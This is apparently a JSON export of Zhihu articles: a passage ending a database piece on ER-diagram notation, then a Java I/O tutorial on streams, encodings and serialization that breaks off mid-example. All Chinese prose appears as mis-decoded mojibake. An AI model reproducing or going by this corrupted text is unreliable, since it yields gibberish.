æ˜¯ä¸€å¯¹å¤šçš„å…³ç³»ã€‚</p><figure data-size=\"normal\"><noscript><img src=\"https://pic2.zhimg.com/v2-17291ae21435bc8bc45723edea9292b9_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"547\" data-rawheight=\"142\" class=\"origin_image zh-lightbox-thumb\" width=\"547\" data-original=\"https://pic2.zhimg.com/v2-17291ae21435bc8bc45723edea9292b9_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;547&#39; height=&#39;142&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"547\" data-rawheight=\"142\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"547\" data-original=\"https://pic2.zhimg.com/v2-17291ae21435bc8bc45723edea9292b9_r.jpg\" data-actualsrc=\"https://pic2.zhimg.com/v2-17291ae21435bc8bc45723edea9292b9_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><h2>è¡¨ç¤ºå‡ºç°å¤šæ¬¡çš„å…³ç³»</h2><p>ä¸€ä¸ªå®ä½“åœ¨è”ç³»å‡ºç°å‡ æ¬¡ï¼Œå°±è¦ç”¨å‡ æ¡çº¿è¿æ¥ã€‚</p><p>ä¸‹å›¾è¡¨ç¤ºä¸€ä¸ªè¯¾ç¨‹çš„å…ˆä¿®å…³ç³»ï¼Œå…ˆä¿®å…³ç³»å‡ºç°ä¸¤ä¸ª Course å®ä½“ï¼Œç¬¬ä¸€ä¸ªæ˜¯å…ˆä¿®è¯¾ç¨‹ï¼Œåä¸€ä¸ªæ˜¯åä¿®è¯¾ç¨‹ï¼Œå› æ­¤éœ€è¦ç”¨ä¸¤æ¡çº¿æ¥è¡¨ç¤ºè¿™ç§å…³ç³»ã€‚</p><figure data-size=\"normal\"><noscript><img src=\"https://pic1.zhimg.com/v2-5aa339bb58d721f86158ba71b56caf20_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"343\" data-rawheight=\"261\" class=\"content_image\" width=\"343\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;343&#39; height=&#39;261&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"343\" data-rawheight=\"261\" class=\"content_image lazy\" width=\"343\" data-actualsrc=\"https://pic1.zhimg.com/v2-5aa339bb58d721f86158ba71b56caf20_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><h2>è”ç³»çš„å¤šå‘æ€§</h2><p>è™½ç„¶è€å¸ˆå¯ä»¥å¼€è®¾å¤šé—¨è¯¾ï¼Œå¹¶ä¸”å¯ä»¥æ•™æˆå¤šåå­¦ç”Ÿï¼Œä½†æ˜¯å¯¹äºç‰¹å®šçš„å­¦ç”Ÿå’Œè¯¾ç¨‹ï¼Œåªæœ‰ä¸€ä¸ªè€å¸ˆæ•™æˆï¼Œè¿™å°±æ„æˆäº†ä¸€ä¸ªä¸‰å…ƒè”ç³»ã€‚</p><figure data-size=\"normal\"><noscript><img src=\"https://pic4.zhimg.com/v2-b7a64e4a7db2e5c85015ba98a40591ab_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"553\" data-rawheight=\"240\" class=\"origin_image zh-lightbox-thumb\" width=\"553\" data-original=\"https://pic4.zhimg.com/v2-b7a64e4a7db2e5c85015ba98a40591ab_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;553&#39; height=&#39;240&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"553\" data-rawheight=\"240\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"553\" data-original=\"https://pic4.zhimg.com/v2-b7a64e4a7db2e5c85015ba98a40591ab_r.jpg\" data-actualsrc=\"https://pic4.zhimg.com/v2-b7a64e4a7db2e5c85015ba98a40591ab_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><h2>è¡¨ç¤ºå­ç±»</h2><p>ç”¨ä¸€ä¸ªä¸‰è§’å½¢å’Œä¸¤æ¡çº¿æ¥è¿æ¥ç±»å’Œå­ç±»ï¼Œä¸å­ç±»æœ‰å…³çš„å±æ€§å’Œè”ç³»éƒ½è¿åˆ°å­ç±»ä¸Šï¼Œè€Œä¸çˆ¶ç±»å’Œå­ç±»éƒ½æœ‰å…³çš„è¿åˆ°çˆ¶ç±»ä¸Šã€‚</p><figure data-size=\"normal\"><noscript><img src=\"https://pic2.zhimg.com/v2-c462ace14933ed85ff3b940fc086bd0d_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"764\" data-rawheight=\"324\" class=\"origin_image zh-lightbox-thumb\" width=\"764\" data-original=\"https://pic2.zhimg.com/v2-c462ace14933ed85ff3b940fc086bd0d_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;764&#39; height=&#39;324&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"764\" data-rawheight=\"324\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"764\" data-original=\"https://pic2.zhimg.com/v2-c462ace14933ed85ff3b940fc086bd0d_r.jpg\" data-actualsrc=\"https://pic2.zhimg.com/v2-c462ace14933ed85ff3b940fc086bd0d_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><h2>å‚è€ƒèµ„æ–™</h2><ul><li>AbrahamSilberschatz, HenryF.Korth, S.Sudarshan, ç­‰. æ•°æ®åº“ç³»ç»Ÿæ¦‚å¿µ [M]. æœºæ¢°å·¥ä¸šå‡ºç‰ˆç¤¾, 2006.</li><li>æ–½ç“¦èŒ¨. é«˜æ€§èƒ½ MYSQL(ç¬¬3ç‰ˆ)[M]. ç”µå­å·¥ä¸šå‡ºç‰ˆç¤¾, 2013.</li><li>å²å˜‰æƒ. æ•°æ®åº“ç³»ç»Ÿæ¦‚è®º[M]. æ¸…åå¤§å­¦å‡ºç‰ˆç¤¾æœ‰é™å…¬å¸, 2006.</li><li><a href=\"https://link.zhihu.com/?target=https%3A//dev.mysql.com/doc/refman/5.7/en/innodb-storage-engine.html\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">The InnoDB Storage Engine</a></li><li><a href=\"https://link.zhihu.com/?target=https%3A//www.slideshare.net/ErnestoHernandezRodriguez/transaction-isolation-levels\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">Transaction isolation levels</a></li><li><a href=\"https://link.zhihu.com/?target=http%3A//scanftree.com/dbms/2-phase-locking-protocol\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">Concurrency Control</a></li><li><a href=\"https://link.zhihu.com/?target=https%3A//www.slideshare.net/brshristov/the-nightmare-of-locking-blocking-and-isolation-levels-46391666\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">The Nightmare of Locking, Blocking and Isolation Levels!</a></li><li><a href=\"https://link.zhihu.com/?target=https%3A//aksakalli.github.io/2012/03/12/database-normalization-and-normal-forms-with-an-example.html\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">Database Normalization and Normal Forms with an Example</a></li><li><a href=\"https://link.zhihu.com/?target=https%3A//blog.jcole.us/2014/04/16/the-basics-of-the-innodb-undo-logging-and-history-system/\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">The basics of the InnoDB undo logging and history system</a></li><li><a href=\"https://link.zhihu.com/?target=https%3A//www.brightbox.com/blog/2013/10/31/on-mysql-locks/\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">MySQL locking for the busy web developer</a></li><li><a href=\"https://link.zhihu.com/?target=https%3A//draveness.me/mysql-innodb\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">æµ…å…¥æµ…å‡º MySQL å’Œ InnoDB</a></li><li><a href=\"https://link.zhihu.com/?target=https%3A//tech.meituan.com/2014/08/20/innodb-lock.html\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">Innodb ä¸­çš„äº‹åŠ¡éš”ç¦»çº§åˆ«å’Œé”çš„å…³ç³»</a></li></ul><p class=\"ztext-empty-paragraph\"><br/></p><figure data-size=\"normal\"><noscript><img src=\"https://pic2.zhimg.com/v2-4d7b61186191042d91d230ccb26a7d99_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"899\" data-rawheight=\"351\" class=\"origin_image zh-lightbox-thumb\" width=\"899\" data-original=\"https://pic2.zhimg.com/v2-4d7b61186191042d91d230ccb26a7d99_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;899&#39; height=&#39;351&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"899\" data-rawheight=\"351\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"899\" data-original=\"https://pic2.zhimg.com/v2-4d7b61186191042d91d230ccb26a7d99_r.jpg\" data-actualsrc=\"https://pic2.zhimg.com/v2-4d7b61186191042d91d230ccb26a7d99_b.jpg\"/></figure><p></p>", 
            "topic": [
                {
                    "tag": "æ•°æ®åº“", 
                    "tagLink": "https://api.zhihu.com/topics/19552067"
                }
            ], 
            "comments": []
        }, 
        {
            "url": "https://zhuanlan.zhihu.com/p/68500017", 
            "userName": "CyC2018", 
            "userLink": "https://www.zhihu.com/people/de0dbaba77411ee53dd3207d762ad7d5", 
            "upvote": 0, 
            "title": "Java I/O", 
            "content": "<p></p><h2>ä¸€ã€æ¦‚è§ˆ</h2><p>Java çš„ I/O å¤§æ¦‚å¯ä»¥åˆ†æˆä»¥ä¸‹å‡ ç±»ï¼š</p><ul><li>ç£ç›˜æ“ä½œï¼šFile</li><li>å­—èŠ‚æ“ä½œï¼šInputStream å’Œ OutputStream</li><li>å­—ç¬¦æ“ä½œï¼šReader å’Œ Writer</li><li>å¯¹è±¡æ“ä½œï¼šSerializable</li><li>ç½‘ç»œæ“ä½œï¼šSocket</li><li>æ–°çš„è¾“å…¥/è¾“å‡ºï¼šNIO</li></ul><h2>äºŒã€ç£ç›˜æ“ä½œ</h2><p>File ç±»å¯ä»¥ç”¨äºè¡¨ç¤ºæ–‡ä»¶å’Œç›®å½•çš„ä¿¡æ¯ï¼Œä½†æ˜¯å®ƒä¸è¡¨ç¤ºæ–‡ä»¶çš„å†…å®¹ã€‚</p><p>é€’å½’åœ°åˆ—å‡ºä¸€ä¸ªç›®å½•ä¸‹æ‰€æœ‰æ–‡ä»¶ï¼š</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kd\">static</span> <span class=\"kt\">void</span> <span class=\"nf\">listAllFiles</span><span class=\"o\">(</span><span class=\"n\">File</span> <span class=\"n\">dir</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">dir</span> <span class=\"o\">==</span> <span class=\"kc\">null</span> <span class=\"o\">||</span> <span class=\"o\">!</span><span class=\"n\">dir</span><span class=\"o\">.</span><span class=\"na\">exists</span><span class=\"o\">())</span> <span class=\"o\">{</span>\n        <span class=\"k\">return</span><span class=\"o\">;</span>\n    <span class=\"o\">}</span>\n    <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">dir</span><span class=\"o\">.</span><span class=\"na\">isFile</span><span class=\"o\">())</span> <span class=\"o\">{</span>\n        <span class=\"n\">System</span><span class=\"o\">.</span><span class=\"na\">out</span><span class=\"o\">.</span><span class=\"na\">println</span><span class=\"o\">(</span><span class=\"n\">dir</span><span class=\"o\">.</span><span class=\"na\">getName</span><span class=\"o\">());</span>\n        <span class=\"k\">return</span><span class=\"o\">;</span>\n    <span class=\"o\">}</span>\n    <span class=\"k\">for</span> <span class=\"o\">(</span><span class=\"n\">File</span> <span class=\"n\">file</span> <span class=\"o\">:</span> <span class=\"n\">dir</span><span class=\"o\">.</span><span class=\"na\">listFiles</span><span class=\"o\">())</span> <span class=\"o\">{</span>\n        <span class=\"n\">listAllFiles</span><span class=\"o\">(</span><span class=\"n\">file</span><span class=\"o\">);</span>\n    <span class=\"o\">}</span>\n<span class=\"o\">}</span></code></pre></div><p>ä» Java7 å¼€å§‹ï¼Œå¯ä»¥ä½¿ç”¨ Paths å’Œ Files ä»£æ›¿ Fileã€‚</p><h2>ä¸‰ã€å­—èŠ‚æ“ä½œ</h2><h2>å®ç°æ–‡ä»¶å¤åˆ¶</h2><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kd\">static</span> <span class=\"kt\">void</span> <span class=\"nf\">copyFile</span><span class=\"o\">(</span><span class=\"n\">String</span> <span class=\"n\">src</span><span class=\"o\">,</span> <span class=\"n\">String</span> <span class=\"n\">dist</span><span class=\"o\">)</span> <span class=\"kd\">throws</span> <span class=\"n\">IOException</span> <span class=\"o\">{</span>\n    <span class=\"n\">FileInputStream</span> <span class=\"n\">in</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">FileInputStream</span><span class=\"o\">(</span><span class=\"n\">src</span><span class=\"o\">);</span>\n    <span class=\"n\">FileOutputStream</span> <span class=\"n\">out</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">FileOutputStream</span><span class=\"o\">(</span><span class=\"n\">dist</span><span class=\"o\">);</span>\n\n    <span class=\"kt\">byte</span><span class=\"o\">[]</span> <span class=\"n\">buffer</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"kt\">byte</span><span class=\"o\">[</span><span class=\"n\">20</span> <span class=\"o\">*</span> <span class=\"n\">1024</span><span class=\"o\">];</span>\n    <span class=\"kt\">int</span> <span class=\"n\">cnt</span><span class=\"o\">;</span>\n\n    <span class=\"c1\">// read() æœ€å¤šè¯»å– buffer.length ä¸ªå­—èŠ‚\n</span><span class=\"c1\"></span>    <span class=\"c1\">// è¿”å›çš„æ˜¯å®é™…è¯»å–çš„ä¸ªæ•°\n</span><span class=\"c1\"></span>    <span class=\"c1\">// è¿”å› -1 çš„æ—¶å€™è¡¨ç¤ºè¯»åˆ° eofï¼Œå³æ–‡ä»¶å°¾\n</span><span class=\"c1\"></span>    <span class=\"k\">while</span> <span class=\"o\">((</span><span class=\"n\">cnt</span> <span class=\"o\">=</span> <span class=\"n\">in</span><span class=\"o\">.</span><span class=\"na\">read</span><span class=\"o\">(</span><span class=\"n\">buffer</span><span class=\"o\">,</span> <span class=\"n\">0</span><span class=\"o\">,</span> <span class=\"n\">buffer</span><span class=\"o\">.</span><span class=\"na\">length</span><span class=\"o\">))</span> <span class=\"o\">!=</span> <span class=\"o\">-</span><span class=\"n\">1</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"n\">out</span><span class=\"o\">.</span><span class=\"na\">write</span><span class=\"o\">(</span><span class=\"n\">buffer</span><span class=\"o\">,</span> <span class=\"n\">0</span><span class=\"o\">,</span> <span class=\"n\">cnt</span><span class=\"o\">);</span>\n    <span class=\"o\">}</span>\n\n    <span class=\"n\">in</span><span class=\"o\">.</span><span class=\"na\">close</span><span class=\"o\">();</span>\n    <span class=\"n\">out</span><span class=\"o\">.</span><span class=\"na\">close</span><span class=\"o\">();</span>\n<span class=\"o\">}</span></code></pre></div><h2>è£…é¥°è€…æ¨¡å¼</h2><p>Java I/O ä½¿ç”¨äº†è£…é¥°è€…æ¨¡å¼æ¥å®ç°ã€‚ä»¥ InputStream ä¸ºä¾‹ï¼Œ</p><ul><li>InputStream æ˜¯æŠ½è±¡ç»„ä»¶ï¼›</li><li>FileInputStream æ˜¯ InputStream çš„å­ç±»ï¼Œå±äºå…·ä½“ç»„ä»¶ï¼Œæä¾›äº†å­—èŠ‚æµçš„è¾“å…¥æ“ä½œï¼›</li><li>FilterInputStream å±äºæŠ½è±¡è£…é¥°è€…ï¼Œè£…é¥°è€…ç”¨äºè£…é¥°ç»„ä»¶ï¼Œä¸ºç»„ä»¶æä¾›é¢å¤–çš„åŠŸèƒ½ã€‚ä¾‹å¦‚ BufferedInputStream ä¸º FileInputStream æä¾›ç¼“å­˜çš„åŠŸèƒ½ã€‚</li></ul><figure data-size=\"normal\"><noscript><img src=\"https://pic2.zhimg.com/v2-74321940629b4766a661bbf48bdd4131_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1225\" data-rawheight=\"499\" class=\"origin_image zh-lightbox-thumb\" width=\"1225\" data-original=\"https://pic2.zhimg.com/v2-74321940629b4766a661bbf48bdd4131_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;1225&#39; height=&#39;499&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1225\" data-rawheight=\"499\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"1225\" data-original=\"https://pic2.zhimg.com/v2-74321940629b4766a661bbf48bdd4131_r.jpg\" data-actualsrc=\"https://pic2.zhimg.com/v2-74321940629b4766a661bbf48bdd4131_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><p>å®ä¾‹åŒ–ä¸€ä¸ªå…·æœ‰ç¼“å­˜åŠŸèƒ½çš„å­—èŠ‚æµå¯¹è±¡æ—¶ï¼Œåªéœ€è¦åœ¨ FileInputStream å¯¹è±¡ä¸Šå†å¥—ä¸€å±‚ BufferedInputStream å¯¹è±¡å³å¯ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"n\">FileInputStream</span> <span class=\"n\">fileInputStream</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">FileInputStream</span><span class=\"o\">(</span><span class=\"n\">filePath</span><span class=\"o\">);</span>\n<span class=\"n\">BufferedInputStream</span> <span class=\"n\">bufferedInputStream</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">BufferedInputStream</span><span class=\"o\">(</span><span class=\"n\">fileInputStream</span><span class=\"o\">);</span></code></pre></div><p>DataInputStream è£…é¥°è€…æä¾›äº†å¯¹æ›´å¤šæ•°æ®ç±»å‹è¿›è¡Œè¾“å…¥çš„æ“ä½œï¼Œæ¯”å¦‚ intã€double ç­‰åŸºæœ¬ç±»å‹ã€‚</p><h2>å››ã€å­—ç¬¦æ“ä½œ</h2><h2>ç¼–ç ä¸è§£ç </h2><p>ç¼–ç å°±æ˜¯æŠŠå­—ç¬¦è½¬æ¢ä¸ºå­—èŠ‚ï¼Œè€Œè§£ç æ˜¯æŠŠå­—èŠ‚é‡æ–°ç»„åˆæˆå­—ç¬¦ã€‚</p><p>å¦‚æœç¼–ç å’Œè§£ç è¿‡ç¨‹ä½¿ç”¨ä¸åŒçš„ç¼–ç æ–¹å¼é‚£ä¹ˆå°±å‡ºç°äº†ä¹±ç ã€‚</p><ul><li>GBK ç¼–ç ä¸­ï¼Œä¸­æ–‡å­—ç¬¦å  2 ä¸ªå­—èŠ‚ï¼Œè‹±æ–‡å­—ç¬¦å  1 ä¸ªå­—èŠ‚ï¼›</li><li>UTF-8 ç¼–ç ä¸­ï¼Œä¸­æ–‡å­—ç¬¦å  3 ä¸ªå­—èŠ‚ï¼Œè‹±æ–‡å­—ç¬¦å  1 ä¸ªå­—èŠ‚ï¼›</li><li>UTF-16be ç¼–ç ä¸­ï¼Œä¸­æ–‡å­—ç¬¦å’Œè‹±æ–‡å­—ç¬¦éƒ½å  2 ä¸ªå­—èŠ‚ã€‚</li></ul><p>UTF-16be ä¸­çš„ be æŒ‡çš„æ˜¯ Big Endianï¼Œä¹Ÿå°±æ˜¯å¤§ç«¯ã€‚ç›¸åº”åœ°ä¹Ÿæœ‰ UTF-16leï¼Œle æŒ‡çš„æ˜¯ Little Endianï¼Œä¹Ÿå°±æ˜¯å°ç«¯ã€‚</p><p>Java çš„å†…å­˜ç¼–ç ä½¿ç”¨åŒå­—èŠ‚ç¼–ç  UTF-16beï¼Œè¿™ä¸æ˜¯æŒ‡ Java åªæ”¯æŒè¿™ä¸€ç§ç¼–ç æ–¹å¼ï¼Œè€Œæ˜¯è¯´ char è¿™ç§ç±»å‹ä½¿ç”¨ UTF-16be è¿›è¡Œç¼–ç ã€‚char ç±»å‹å  16 ä½ï¼Œä¹Ÿå°±æ˜¯ä¸¤ä¸ªå­—èŠ‚ï¼ŒJava ä½¿ç”¨è¿™ç§åŒå­—èŠ‚ç¼–ç æ˜¯ä¸ºäº†è®©ä¸€ä¸ªä¸­æ–‡æˆ–è€…ä¸€ä¸ªè‹±æ–‡éƒ½èƒ½ä½¿ç”¨ä¸€ä¸ª char æ¥å­˜å‚¨ã€‚</p><h2>String çš„ç¼–ç æ–¹å¼</h2><p>String å¯ä»¥çœ‹æˆä¸€ä¸ªå­—ç¬¦åºåˆ—ï¼Œå¯ä»¥æŒ‡å®šä¸€ä¸ªç¼–ç æ–¹å¼å°†å®ƒç¼–ç ä¸ºå­—èŠ‚åºåˆ—ï¼Œä¹Ÿå¯ä»¥æŒ‡å®šä¸€ä¸ªç¼–ç æ–¹å¼å°†ä¸€ä¸ªå­—èŠ‚åºåˆ—è§£ç ä¸º Stringã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"n\">String</span> <span class=\"n\">str1</span> <span class=\"o\">=</span> <span class=\"s\">&#34;ä¸­æ–‡&#34;</span><span class=\"o\">;</span>\n<span class=\"kt\">byte</span><span class=\"o\">[]</span> <span class=\"n\">bytes</span> <span class=\"o\">=</span> <span class=\"n\">str1</span><span class=\"o\">.</span><span class=\"na\">getBytes</span><span class=\"o\">(</span><span class=\"s\">&#34;UTF-8&#34;</span><span class=\"o\">);</span>\n<span class=\"n\">String</span> <span class=\"n\">str2</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">String</span><span class=\"o\">(</span><span class=\"n\">bytes</span><span class=\"o\">,</span> <span class=\"s\">&#34;UTF-8&#34;</span><span class=\"o\">);</span>\n<span class=\"n\">System</span><span class=\"o\">.</span><span class=\"na\">out</span><span class=\"o\">.</span><span class=\"na\">println</span><span class=\"o\">(</span><span class=\"n\">str2</span><span class=\"o\">);</span></code></pre></div><p>åœ¨è°ƒç”¨æ— å‚æ•° getBytes() æ–¹æ³•æ—¶ï¼Œé»˜è®¤çš„ç¼–ç æ–¹å¼ä¸æ˜¯ UTF-16beã€‚åŒå­—èŠ‚ç¼–ç çš„å¥½å¤„æ˜¯å¯ä»¥ä½¿ç”¨ä¸€ä¸ª char å­˜å‚¨ä¸­æ–‡å’Œè‹±æ–‡ï¼Œè€Œå°† String è½¬ä¸º bytes[] å­—èŠ‚æ•°ç»„å°±ä¸å†éœ€è¦è¿™ä¸ªå¥½å¤„ï¼Œå› æ­¤ä¹Ÿå°±ä¸å†éœ€è¦åŒå­—èŠ‚ç¼–ç ã€‚getBytes() çš„é»˜è®¤ç¼–ç æ–¹å¼ä¸å¹³å°æœ‰å…³ï¼Œä¸€èˆ¬ä¸º UTF-8ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kt\">byte</span><span class=\"o\">[]</span> <span class=\"n\">bytes</span> <span class=\"o\">=</span> <span class=\"n\">str1</span><span class=\"o\">.</span><span class=\"na\">getBytes</span><span class=\"o\">();</span></code></pre></div><h2>Reader ä¸ Writer</h2><p>ä¸ç®¡æ˜¯ç£ç›˜è¿˜æ˜¯ç½‘ç»œä¼ è¾“ï¼Œæœ€å°çš„å­˜å‚¨å•å…ƒéƒ½æ˜¯å­—èŠ‚ï¼Œè€Œä¸æ˜¯å­—ç¬¦ã€‚ä½†æ˜¯åœ¨ç¨‹åºä¸­æ“ä½œçš„é€šå¸¸æ˜¯å­—ç¬¦å½¢å¼çš„æ•°æ®ï¼Œå› æ­¤éœ€è¦æä¾›å¯¹å­—ç¬¦è¿›è¡Œæ“ä½œçš„æ–¹æ³•ã€‚</p><ul><li>InputStreamReader å®ç°ä»å­—èŠ‚æµè§£ç æˆå­—ç¬¦æµï¼›</li><li>OutputStreamWriter å®ç°å­—ç¬¦æµç¼–ç æˆä¸ºå­—èŠ‚æµã€‚</li></ul><h2>å®ç°é€è¡Œè¾“å‡ºæ–‡æœ¬æ–‡ä»¶çš„å†…å®¹</h2><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kd\">static</span> <span class=\"kt\">void</span> <span class=\"nf\">readFileContent</span><span class=\"o\">(</span><span class=\"n\">String</span> <span class=\"n\">filePath</span><span class=\"o\">)</span> <span class=\"kd\">throws</span> <span class=\"n\">IOException</span> <span class=\"o\">{</span>\n\n    <span class=\"n\">FileReader</span> <span class=\"n\">fileReader</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">FileReader</span><span class=\"o\">(</span><span class=\"n\">filePath</span><span class=\"o\">);</span>\n    <span class=\"n\">BufferedReader</span> <span class=\"n\">bufferedReader</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">BufferedReader</span><span class=\"o\">(</span><span class=\"n\">fileReader</span><span class=\"o\">);</span>\n\n    <span class=\"n\">String</span> <span class=\"n\">line</span><span class=\"o\">;</span>\n    <span class=\"k\">while</span> <span class=\"o\">((</span><span class=\"n\">line</span> <span class=\"o\">=</span> <span class=\"n\">bufferedReader</span><span class=\"o\">.</span><span class=\"na\">readLine</span><span class=\"o\">())</span> <span class=\"o\">!=</span> <span class=\"kc\">null</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"n\">System</span><span class=\"o\">.</span><span class=\"na\">out</span><span class=\"o\">.</span><span class=\"na\">println</span><span class=\"o\">(</span><span class=\"n\">line</span><span class=\"o\">);</span>\n    <span class=\"o\">}</span>\n\n    <span class=\"c1\">// è£…é¥°è€…æ¨¡å¼ä½¿å¾— BufferedReader ç»„åˆäº†ä¸€ä¸ª Reader å¯¹è±¡\n</span><span class=\"c1\"></span>    <span class=\"c1\">// åœ¨è°ƒç”¨ BufferedReader çš„ close() æ–¹æ³•æ—¶ä¼šå»è°ƒç”¨ Reader çš„ close() æ–¹æ³•\n</span><span class=\"c1\"></span>    <span class=\"c1\">// å› æ­¤åªè¦ä¸€ä¸ª close() è°ƒç”¨å³å¯\n</span><span class=\"c1\"></span>    <span class=\"n\">bufferedReader</span><span class=\"o\">.</span><span class=\"na\">close</span><span class=\"o\">();</span>\n<span class=\"o\">}</span></code></pre></div><h2>äº”ã€å¯¹è±¡æ“ä½œ</h2><h2>åºåˆ—åŒ–</h2><p>åºåˆ—åŒ–å°±æ˜¯å°†ä¸€ä¸ªå¯¹è±¡è½¬æ¢æˆå­—èŠ‚åºåˆ—ï¼Œæ–¹ä¾¿å­˜å‚¨å’Œä¼ è¾“ã€‚</p><ul><li>åºåˆ—åŒ–ï¼šObjectOutputStream.writeObject()</li><li>ååºåˆ—åŒ–ï¼šObjectInputStream.readObject()</li></ul><p>ä¸ä¼šå¯¹é™æ€å˜é‡è¿›è¡Œåºåˆ—åŒ–ï¼Œå› ä¸ºåºåˆ—åŒ–åªæ˜¯ä¿å­˜å¯¹è±¡çš„çŠ¶æ€ï¼Œé™æ€å˜é‡å±äºç±»çš„çŠ¶æ€ã€‚</p><h2>Serializable</h2><p>åºåˆ—åŒ–çš„ç±»éœ€è¦å®ç° Serializable æ¥å£ï¼Œå®ƒåªæ˜¯ä¸€ä¸ªæ ‡å‡†ï¼Œæ²¡æœ‰ä»»ä½•æ–¹æ³•éœ€è¦å®ç°ï¼Œä½†æ˜¯å¦‚æœä¸å»å®ç°å®ƒçš„è¯è€Œè¿›è¡Œåºåˆ—åŒ–ï¼Œä¼šæŠ›å‡ºå¼‚å¸¸ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kd\">static</span> <span class=\"kt\">void</span> <span class=\"nf\">main</span><span class=\"o\">(</span><span class=\"n\">String</span><span class=\"o\">[]</span> <span class=\"n\">args</span><span class=\"o\">)</span> <span class=\"kd\">throws</span> <span class=\"n\">IOException</span><span class=\"o\">,</span> <span class=\"n\">ClassNotFoundException</span> <span class=\"o\">{</span>\n\n    <span class=\"n\">A</span> <span class=\"n\">a1</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">A</span><span class=\"o\">(</span><span class=\"n\">123</span><span class=\"o\">,</span> <span class=\"s\">&#34;abc&#34;</span><span class=\"o\">);</span>\n    <span class=\"n\">String</span> <span class=\"n\">objectFile</span> <span class=\"o\">=</span> <span class=\"s\">&#34;file/a1&#34;</span><span class=\"o\">;</span>\n\n    <span class=\"n\">ObjectOutputStream</span> <span class=\"n\">objectOutputStream</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">ObjectOutputStream</span><span class=\"o\">(</span><span class=\"k\">new</span> <span class=\"n\">FileOutputStream</span><span class=\"o\">(</span><span class=\"n\">objectFile</span><span class=\"o\">));</span>\n    <span class=\"n\">objectOutputStream</span><span class=\"o\">.</span><span class=\"na\">writeObject</span><span class=\"o\">(</span><span class=\"n\">a1</span><span class=\"o\">);</span>\n    <span class=\"n\">objectOutputStream</span><span class=\"o\">.</span><span class=\"na\">close</span><span class=\"o\">();</span>\n\n    <span class=\"n\">ObjectInputStream</span> <span class=\"n\">objectInputStream</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">ObjectInputStream</span><span class=\"o\">(</span><span class=\"k\">new</span> <span class=\"n\">FileInputStream</span><span class=\"o\">(</span><span 